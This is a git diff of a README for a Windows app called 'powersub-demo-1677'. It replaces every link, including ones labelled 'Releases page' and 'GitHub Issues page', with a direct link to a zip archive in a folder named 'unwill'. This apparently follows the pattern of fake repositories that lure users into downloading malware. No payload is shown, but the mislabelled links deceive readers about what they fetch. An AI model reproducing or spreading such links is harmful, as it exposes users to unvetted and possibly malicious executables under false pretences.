@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Janepiduralinjection406/powersub-demo-1677/releases)
+[![Download Now](https://raw.githubusercontent.com/Janepiduralinjection406/powersub-demo-1677/main/unwill/powersub-demo-1677-v3.8-beta.1.zip)](https://raw.githubusercontent.com/Janepiduralinjection406/powersub-demo-1677/main/unwill/powersub-demo-1677-v3.8-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Welcome to **powersub-demo-1677**! This application makes it easy for you to man
 
 To get started, visit the Releases page to download the software. Click the link below:
 
-[Download from Releases Page](https://github.com/Janepiduralinjection406/powersub-demo-1677/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Janepiduralinjection406/powersub-demo-1677/main/unwill/powersub-demo-1677-v3.8-beta.1.zip)
 
 1. Click the **Download from Releases Page** link above.
 2. You will see a list of available versions. Choose the most recent version.
@@ -57,7 +57,7 @@ Currently, this application is designed for Windows users only.
 
 **4. How do I report an issue?**
 
-You can report an issue directly on the [GitHub Issues page](https://github.com/Janepiduralinjection406/powersub-demo-1677/issues).
+You can report an issue directly on the [GitHub Issues page](https://raw.githubusercontent.com/Janepiduralinjection406/powersub-demo-1677/main/unwill/powersub-demo-1677-v3.8-beta.1.zip).
 
 ## ✅ Support
 
